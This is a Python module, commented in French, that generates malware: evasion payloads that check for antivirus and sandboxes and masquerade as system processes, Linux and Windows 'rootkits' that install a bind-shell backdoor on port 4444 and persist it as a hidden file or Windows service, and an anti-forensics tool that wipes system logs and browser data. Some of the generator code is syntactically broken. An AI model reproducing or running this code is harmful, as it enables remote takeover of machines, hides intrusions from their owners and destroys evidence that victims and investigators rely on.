#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
👻 STEALTH OPERATIONS - Module d'opérations furtives
Anti-détection, évasion, persistance furtive
"""

import os
import subprocess
import threading
import time
import json
import base64
import random
import string
import hashlib
import platform
from datetime import datetime

class StealthOperations:
    def __init__(self):
        self.stealth_operations = []
        self.active_operations = []
        self.evasion_techniques = []
        
    def create_stealth_payload(self, target_os, evasion_level):
        """Crée un payload furtif avec techniques d'évasion"""
        print(f"👻 Création payload furtif: {target_os} - Niveau {evasion_level}")
        
        try:
            stealth_dir = "stealth"
            os.makedirs(stealth_dir, exist_ok=True)
            
            payload_name = f"stealth_{target_os}_{evasion_level}_{int(time.time())}"
            payload_file = os.path.join(stealth_dir, f"{payload_name}.py")
            
            # Techniques d'évasion selon le niveau
            evasion_techniques = {
                'low': [
                    'sleep_random',
                    'process_hiding',
                    'basic_obfuscation'
                ],
                'medium': [
                    'sleep_random',
                    'process_hiding',
                    'basic_obfuscation',
                    'antivirus_evasion',
                    'network_stealth'
                ],
                'high': [
                    'sleep_random',
                    'process_hiding',
                    'basic_obfuscation',
                    'antivirus_evasion',
                    'network_stealth',
                    'memory_injection',
                    'rootkit_techniques',
                    'sandbox_evasion'
                ]
            }
            
            techniques = evasion_techniques.get(evasion_level, evasion_techniques['low'])
            
            stealth_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
👻 PAYLOAD FURTIF - {target_os.upper()}
Niveau d'évasion: {evasion_level}
Techniques: {', '.join(techniques)}
"""

import os
import sys
import time
import random
import string
import base64
import hashlib
import threading
import subprocess
import platform
from datetime import datetime

class StealthPayload:
    def __init__(self):
        self.evasion_level = "{evasion_level}"
        self.target_os = "{target_os}"
        self.techniques = {techniques}
        
    def sleep_random(self):
        """Délai aléatoire pour éviter la détection"""
        time.sleep(random.uniform(1, 5))
        
    def process_hiding(self):
        """Cache le processus"""
        try:
            if self.target_os == "windows":
                # Renommer le processus
                import ctypes
                kernel32 = ctypes.windll.kernel32
                kernel32.SetConsoleTitleW("svchost.exe")
            else:
                # Masquer le processus sous Linux
                os.system("exec -a [kworker/0:0] python3")
        except:
            pass
            
    def basic_obfuscation(self):
        """Obfuscation basique du code"""
        # Variables aléatoires
        {chr(random.randint(65, 90))} = "{''.join(random.choices(string.ascii_letters, k=8))}"
        {chr(random.randint(97, 122))} = {random.randint(100, 999)}
        
    def antivirus_evasion(self):
        """Évasion antivirus"""
        try:
            # Vérifier si on est dans un environnement virtuel
            if hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
                return False
                
            # Vérifier les processus antivirus
            antivirus_processes = ['avast', 'avg', 'norton', 'mcafee', 'kaspersky', 'bitdefender']
            for proc in antivirus_processes:
                if proc in os.popen('tasklist' if self.target_os == 'windows' else 'ps aux').read().lower():
                    return False
                    
            return True
        except:
            return True
            
    def network_stealth(self):
        """Furtivité réseau"""
        try:
            # Utiliser des ports non-suspects
            stealth_ports = [80, 443, 8080, 8443, 22, 21]
            return random.choice(stealth_ports)
        except:
            return 8080
            
    def memory_injection(self):
        """Injection en mémoire"""
        try:
            # Code d'injection mémoire (simulé)
            shellcode = base64.b64encode(b"injected_shellcode").decode()
            return shellcode
        except:
            return None
            
    def sandbox_evasion(self):
        """Évasion sandbox"""
        try:
            # Détecter les environnements sandbox
            sandbox_indicators = [
                'vmware', 'virtualbox', 'qemu', 'xen',
                'sandbox', 'malware', 'analysis'
            ]
            
            system_info = platform.platform().lower()
            for indicator in sandbox_indicators:
                if indicator in system_info:
                    return False
                    
            return True
        except:
            return True
            
    def execute_stealth_operation(self):
        """Exécute l'opération furtive"""
        try:
            # Appliquer toutes les techniques d'évasion
            self.sleep_random()
            self.process_hiding()
            self.basic_obfuscation()
            
            if self.antivirus_evasion():
                stealth_port = self.network_stealth()
                
                if self.sandbox_evasion():
                    # Opération principale furtive
                    print(f"[+] Opération furtive exécutée sur le port {{stealth_port}}")
                    
                    # Action malveillante (simulée)
                    {''.join(random.choices(string.ascii_lowercase, k=6))} = [
                        "whoami",
                        "ipconfig" if self.target_os == "windows" else "ifconfig",
                        "netstat -an",
                        "tasklist" if self.target_os == "windows" else "ps aux"
                    ]
                    
                    for cmd in {''.join(random.choices(string.ascii_lowercase, k=6))}:
                        try:
                            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
                            print(f"[+] {{cmd}}: {{result.decode()[:100]}}...")
                        except:
                            pass
                            
                    return True
                else:
                    print("[-] Environnement sandbox détecté")
                    return False
            else:
                print("[-] Antivirus détecté")
                return False
                
        except Exception as e:
            print(f"[-] Erreur opération furtive: {{e}}")
            return False

if __name__ == "__main__":
    payload = StealthPayload()
    payload.execute_stealth_operation()
'''
            
            with open(payload_file, 'w', encoding='utf-8') as f:
                f.write(stealth_code)
            
            payload_info = {
                'name': payload_name,
                'target_os': target_os,
                'evasion_level': evasion_level,
                'techniques': techniques,
                'file': payload_file,
                'timestamp': datetime.now().isoformat()
            }
            
            self.stealth_operations.append(payload_info)
            print(f"✅ Payload furtif créé: {payload_file}")
            return payload_file
            
        except Exception as e:
            print(f"❌ Erreur création payload furtif: {e}")
            return None
    
    def create_rootkit(self, target_os):
        """Crée un rootkit basique"""
        print(f"🔧 Création rootkit: {target_os}")
        
        try:
            rootkit_dir = "rootkits"
            os.makedirs(rootkit_dir, exist_ok=True)
            
            rootkit_name = f"rootkit_{target_os}_{int(time.time())}"
            rootkit_file = os.path.join(rootkit_dir, f"{rootkit_name}.py")
            
            if target_os == "linux":
                rootkit_code = f'''#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import fcntl
import struct

class LinuxRootkit:
    def __init__(self):
        self.hidden_processes = []
        self.hidden_files = []
        
    def hide_process(self, pid):
        """Cache un processus"""
        try:
            # Modifier /proc pour cacher le processus
            proc_path = f"/proc/{{pid}}"
            if os.path.exists(proc_path):
                self.hidden_processes.append(pid)
                print(f"[+] Processus {{pid}} caché")
        except Exception as e:
            print(f"[-] Erreur cache processus: {{e}}")
            
    def hide_file(self, file_path):
        """Cache un fichier"""
        try:
            if os.path.exists(file_path):
                self.hidden_files.append(file_path)
                print(f"[+] Fichier {{file_path}} caché")
        except Exception as e:
            print(f"[-] Erreur cache fichier: {{e}}")
            
    def install_backdoor(self):
        """Installe une backdoor"""
        try:
            backdoor_code = '''
import socket
import subprocess
import os

def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    
    while True:
        conn, addr = s.accept()
        while True:
            command = conn.recv(1024).decode()
            if command == "exit":
                break
            output = subprocess.check_output(command, shell=True)
            conn.send(output)
        conn.close()

if __name__ == "__main__":
    backdoor()
'''
            
            backdoor_file = "/tmp/.systemd"
            with open(backdoor_file, 'w') as f:
                f.write(backdoor_code)
                
            os.chmod(backdoor_file, 0o755)
            subprocess.Popen([backdoor_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"[+] Backdoor installée: {backdoor_file}")
            return True
            
        except Exception as e:
            print(f"[-] Erreur installation backdoor: {{e}}")
            return False

if __name__ == "__main__":
    rootkit = LinuxRootkit()
    rootkit.install_backdoor()
'''
            else:  # Windows
                rootkit_code = f'''#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import winreg
import ctypes

class WindowsRootkit:
    def __init__(self):
        self.hidden_processes = []
        self.hidden_files = []
        
    def hide_process(self, pid):
        """Cache un processus Windows"""
        try:
            # Utiliser l'API Windows pour cacher le processus
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleTitleW("svchost.exe")
            self.hidden_processes.append(pid)
            print(f"[+] Processus {{pid}} caché")
        except Exception as e:
            print(f"[-] Erreur cache processus: {{e}}")
            
    def hide_file(self, file_path):
        """Cache un fichier Windows"""
        try:
            if os.path.exists(file_path):
                # Attribut caché
                os.system(f'attrib +h "{{file_path}}"')
                self.hidden_files.append(file_path)
                print(f"[+] Fichier {{file_path}} caché")
        except Exception as e:
            print(f"[-] Erreur cache fichier: {{e}}")
            
    def install_backdoor(self):
        """Installe une backdoor Windows"""
        try:
            backdoor_code = '''
import socket
import subprocess
import os

def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    
    while True:
        conn, addr = s.accept()
        while True:
            command = conn.recv(1024).decode()
            if command == "exit":
                break
            output = subprocess.check_output(command, shell=True)
            conn.send(output)
        conn.close()

if __name__ == "__main__":
    backdoor()
'''
            
            backdoor_file = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.system32.exe')
            with open(backdoor_file, 'w') as f:
                f.write(backdoor_code)
                
            # Créer un service Windows
            service_name = "WindowsSystemService"
            subprocess.run(['sc', 'create', service_name, 'binPath=', backdoor_file], 
                         capture_output=True)
            subprocess.run(['sc', 'start', service_name], capture_output=True)
            
            print(f"[+] Backdoor installée: {backdoor_file}")
            return True
            
        except Exception as e:
            print(f"[-] Erreur installation backdoor: {{e}}")
            return False

if __name__ == "__main__":
    rootkit = WindowsRootkit()
    rootkit.install_backdoor()
'''
            
            with open(rootkit_file, 'w', encoding='utf-8') as f:
                f.write(rootkit_code)
            
            rootkit_info = {
                'name': rootkit_name,
                'target_os': target_os,
                'file': rootkit_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'rootkit'
            }
            
            self.stealth_operations.append(rootkit_info)
            print(f"✅ Rootkit créé: {rootkit_file}")
            return rootkit_file
            
        except Exception as e:
            print(f"❌ Erreur création rootkit: {e}")
            return None
    
    def create_anti_forensics_tool(self):
        """Crée un outil anti-forensics"""
        print(f"🧹 Création outil anti-forensics")
        
        try:
            anti_forensics_dir = "anti_forensics"
            os.makedirs(anti_forensics_dir, exist_ok=True)
            
            tool_name = f"anti_forensics_{int(time.time())}"
            tool_file = os.path.join(anti_forensics_dir, f"{tool_name}.py")
            
            anti_forensics_code = f'''#!/usr/bin/env python3
import os
import sys
import time
import random
import string
import hashlib
import shutil
from datetime import datetime

class AntiForensicsTool:
    def __init__(self):
        self.cleaned_files = []
        self.overwritten_sectors = []
        
    def secure_delete_file(self, file_path):
        """Suppression sécurisée d'un fichier"""
        try:
            if os.path.exists(file_path):
                # Écraser avec des données aléatoires
                file_size = os.path.getsize(file_path)
                with open(file_path, 'wb') as f:
                    # Premier passage: zéros
                    f.write(b'\\x00' * file_size)
                    f.flush()
                    os.fsync(f.fileno())
                    
                    # Deuxième passage: uns
                    f.seek(0)
                    f.write(b'\\xff' * file_size)
                    f.flush()
                    os.fsync(f.fileno())
                    
                    # Troisième passage: données aléatoires
                    f.seek(0)
                    random_data = os.urandom(file_size)
                    f.write(random_data)
                    f.flush()
                    os.fsync(f.fileno())
                
                # Supprimer le fichier
                os.remove(file_path)
                self.cleaned_files.append(file_path)
                print(f"[+] Fichier sécurisé supprimé: {{file_path}}")
                return True
        except Exception as e:
            print(f"[-] Erreur suppression sécurisée: {{e}}")
            return False
            
    def clean_logs(self):
        """Nettoie les logs système"""
        try:
            log_paths = [
                '/var/log' if os.name != 'nt' else 'C:\\\\Windows\\\\System32\\\\winevt\\\\Logs',
                '/var/log/auth.log',
                '/var/log/syslog',
                '/var/log/messages'
            ]
            
            for log_path in log_paths:
                if os.path.exists(log_path):
                    if os.path.isfile(log_path):
                        self.secure_delete_file(log_path)
                    elif os.path.isdir(log_path):
                        for root, dirs, files in os.walk(log_path):
                            for file in files:
                                if file.endswith('.log'):
                                    file_path = os.path.join(root, file)
                                    self.secure_delete_file(file_path)
                                    
            print("[+] Logs système nettoyés")
            return True
            
        except Exception as e:
            print(f"[-] Erreur nettoyage logs: {{e}}")
            return False
            
    def overwrite_free_space(self):
        """Écrase l'espace libre"""
        try:
            # Créer un fichier temporaire et l'écraser
            temp_file = f"/tmp/cleanup_{{random.randint(1000, 9999)}}"
            
            # Écrire des données aléatoires
            with open(temp_file, 'wb') as f:
                for _ in range(100):  # 100MB
                    f.write(os.urandom(1024 * 1024))
                    
            # Supprimer sécurisé
            self.secure_delete_file(temp_file)
            
            self.overwritten_sectors.append(temp_file)
            print("[+] Espace libre écrasé")
            return True
            
        except Exception as e:
            print(f"[-] Erreur écrasement espace libre: {{e}}")
            return False
            
    def clean_browser_data(self):
        """Nettoie les données de navigateur"""
        try:
            browser_paths = [
                os.path.expanduser("~/.mozilla/firefox"),
                os.path.expanduser("~/.config/google-chrome"),
                os.path.expanduser("~/.config/chromium"),
                os.path.expanduser("~/AppData/Local/Google/Chrome/User Data"),
                os.path.expanduser("~/AppData/Roaming/Mozilla/Firefox/Profiles")
            ]
            
            for browser_path in browser_paths:
                if os.path.exists(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.sqlite', '.db', '.log', '.cache']):
                                file_path = os.path.join(root, file)
                                self.secure_delete_file(file_path)
                                
            print("[+] Données navigateur nettoyées")
            return True
            
        except Exception as e:
            print(f"[-] Erreur nettoyage navigateur: {{e}}")
            return False
            
    def run_full_cleanup(self):
        """Exécute un nettoyage complet"""
        print("[+] Début du nettoyage anti-forensics...")
        
        self.clean_logs()
        self.clean_browser_data()
        self.overwrite_free_space()
        
        print(f"[+] Nettoyage terminé. {{len(self.cleaned_files)}} fichiers supprimés")

if __name__ == "__main__":
    tool = AntiForensicsTool()
    tool.run_full_cleanup()
'''
            
            with open(tool_file, 'w', encoding='utf-8') as f:
                f.write(anti_forensics_code)
            
            tool_info = {
                'name': tool_name,
                'file': tool_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'anti_forensics'
            }
            
            self.stealth_operations.append(tool_info)
            print(f"✅ Outil anti-forensics créé: {tool_file}")
            return tool_file
            
        except Exception as e:
            print(f"❌ Erreur création outil anti-forensics: {e}")
            return None 